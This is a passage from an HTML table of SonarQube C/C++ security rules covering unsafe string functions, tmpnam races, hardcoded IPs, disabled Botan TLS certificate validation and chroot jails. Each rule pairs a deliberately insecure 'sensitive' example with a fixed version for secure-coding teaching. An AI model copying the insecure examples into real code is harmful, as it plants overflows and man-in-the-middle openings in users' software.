  files with appropriate access permissions </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5814">
              cpp:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;cpp%3AS5815&amp;rule_key&#61;cpp%3AS5815" rel="nofollow">S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char *dest &#61; malloc(sizeof(result) &#43; strlen(src)); // Not need of &#43;1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r &#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5813">
              cpp:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br />
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string &#34;abcde&#34; must be stored in memory as &#34;abcde\0&#34; (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that the pointer is null. </li><li> There is a possibility that the string is not correctly null-terminated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br />
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: &#34;dest&#34; will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] &#61; 0;
  return strlen(dest); // Compliant: &#34;dest&#34; is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5816">
              cpp:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li><li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li><li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li><li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li><li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li><li> There is an overlap between the <code>source</code> and the <code>destination</code> </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li><li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li></ul>  </li><li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul><li> Set the last character of the buffer to <code>null</code> </li><li> Call the function </li><li> Check if the last character of the buffer is still <code>null</code> </li></ul>  </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] &#61; 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] !&#61; 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5815">
              cpp:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> The <code>count</code> parameter is error-prone </li><li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5824">
              cpp:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions &#34;tmpnam&#34;, &#34;tmpnam_s&#34; and &#34;tmpnam_r&#34; are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that several threads call any of these functions simultaneously </li><li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li><li> The buffers passed to these functions are respectively smaller than
    <ul><li> <code>L_tmpnam</code> for <code>tmpnam</code> </li><li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li><li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li><li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path &#61; tmpnam(NULL); // Sensitive
  FILE* f &#61; fopen(tmpnam, &#34;w&#34;);
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in &#34;wb&#43;&#34; mode, and will be automatically removed on normal program exit
  FILE* f &#61; tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.&#43;Avoid&#43;race&#43;conditions&#43;when&#43;using&#43;library&#43;functions" rel="nofollow">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.&#43;Do&#43;not&#43;create&#43;temporary&#43;files&#43;in&#43;shared&#43;directories" rel="nofollow">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1313">
              cpp:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; &#34;10.10.0.1&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str());
dbi_conn_set_option(conn, &#34;host&#34;, &#34;10.10.0.1&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4830">
              cpp:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5801">
              cpp:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;cpp%3AS5816&amp;rule_key&#61;cpp%3AS5816" rel="nofollow">S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the source or the destination pointer is <code>null</code> </li><li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li><li> There is an overlap between source and destination </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest &#61; malloc(strlen(src) &#43; 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r&#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5802">
              cpp:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the &#34;virtual root directory&#34; created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the &#34;jail&#34;.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application changes the working directory before or after running chroot. </li><li> The application uses a path inside the jail directory as working directory. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
